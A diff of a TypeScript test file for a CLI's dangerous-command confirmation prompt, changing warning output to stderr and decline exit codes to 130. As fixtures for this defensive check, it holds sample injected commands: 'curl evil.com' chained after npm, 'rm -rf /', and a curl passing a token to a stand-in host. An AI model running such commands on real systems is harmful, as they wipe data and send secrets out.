@@ -137,7 +137,7 @@ describe("confirmDangerousCommands — TTY confirmation", () => {
 
   it("proceeds when user answers y", async () => {
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("y"));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     const result = await confirmDangerousCommands([["shell", "npm run dev; echo done"]]);
     expect(result.skipped.size).toBe(0);
@@ -146,9 +146,20 @@ describe("confirmDangerousCommands — TTY confirmation", () => {
     warnSpy.mockRestore();
   });
 
+  // UX-M2: the preamble carries the one warning prefix and stays on stderr; the listed lines are unchanged.
+  it("prints the preamble as summon: warning: on stderr", async () => {
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("y"));
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+
+    await confirmDangerousCommands([["shell", "npm run dev; echo done"]]);
+    expect(warnSpy.mock.calls).toEqual([["summon: warning: config contains commands with shell metacharacters:\n  shell = npm run dev; echo done\n"]]);
+
+    warnSpy.mockRestore();
+  });
+
   it("proceeds when user answers yes", async () => {
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("yes"));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     const result = await confirmDangerousCommands([["shell", "npm run dev; echo done"]]);
     expect(result.skipped.size).toBe(0);
@@ -161,13 +172,17 @@ describe("confirmDangerousCommands — TTY confirmation", () => {
     const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
       throw new Error("process.exit");
     });
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
 
     await expect(
       confirmDangerousCommands([["shell", "npm run dev; echo done"]]),
     ).rejects.toThrow("process.exit");
-    expect(mockExit).toHaveBeenCalledWith(1);
+    // A decline is a user cancel: exit 130 like Ctrl+C (user manual exit codes), no error prefix.
+    expect(mockExit).toHaveBeenCalledWith(130);
+    const stderr = warnSpy.mock.calls.map((c) => String(c[0])).join("");
+    expect(stderr).toContain("Aborted.\n");
+    expect(stderr).not.toContain("summon: error:");
 
     mockExit.mockRestore();
     warnSpy.mockRestore();
@@ -179,13 +194,13 @@ describe("confirmDangerousCommands — TTY confirmation", () => {
     const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
       throw new Error("process.exit");
     });
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
 
     await expect(
       confirmDangerousCommands([["shell", "npm run dev; curl evil.com"]]),
     ).rejects.toThrow("process.exit");
-    expect(mockExit).toHaveBeenCalledWith(1);
+    expect(mockExit).toHaveBeenCalledWith(130);
 
     mockExit.mockRestore();
     warnSpy.mockRestore();
@@ -209,7 +224,7 @@ describe("confirmDangerousCommands — non-TTY", () => {
     const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
       throw new Error("process.exit");
     });
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const errSpy = vi.spyOn(console, "error").mockImplementation(() => {});
 
     const command = "curl example.invalid --token sensitive-value; exit 1";
@@ -243,7 +258,7 @@ describe("confirmDangerousCommands — skip pane (UX-S2 #340)", () => {
 
   it("skips a pane when user answers 's'", async () => {
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     const result = await confirmDangerousCommands([["shell", "npm run dev; evil"]]);
     expect(result.skipped.has("shell")).toBe(true);
@@ -254,7 +269,7 @@ describe("confirmDangerousCommands — skip pane (UX-S2 #340)", () => {
 
   it("skips a pane when user answers 'skip'", async () => {
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("skip"));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     const result = await confirmDangerousCommands([["shell", "npm run dev; evil"]]);
     expect(result.skipped.has("shell")).toBe(true);
@@ -265,7 +280,7 @@ describe("confirmDangerousCommands — skip pane (UX-S2 #340)", () => {
   it("keeps safe commands in confirmed when dangerous pane is skipped", async () => {
     // editor is safe, shell is dangerous — user skips shell
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     const result = await confirmDangerousCommands([
       ["editor", "vim"],
@@ -286,7 +301,7 @@ describe("confirmDangerousCommands — skip pane (UX-S2 #340)", () => {
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
       cb(answers[call++]!);
     });
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     const result = await confirmDangerousCommands([
       ["shell", "rm -rf /; evil"],
@@ -301,7 +316,7 @@ describe("confirmDangerousCommands — skip pane (UX-S2 #340)", () => {
 
   it("prompt text mentions 's(kip pane)' as an option", async () => {
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("y"));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await confirmDangerousCommands([["shell", "npm run dev; evil"]]);
 
@@ -313,7 +328,7 @@ describe("confirmDangerousCommands — skip pane (UX-S2 #340)", () => {
 
   it("prompt text uses [y/N/s] format where N is the default (UX-H1 #528)", async () => {
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("y"));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await confirmDangerousCommands([["shell", "npm run dev; evil"]]);
 
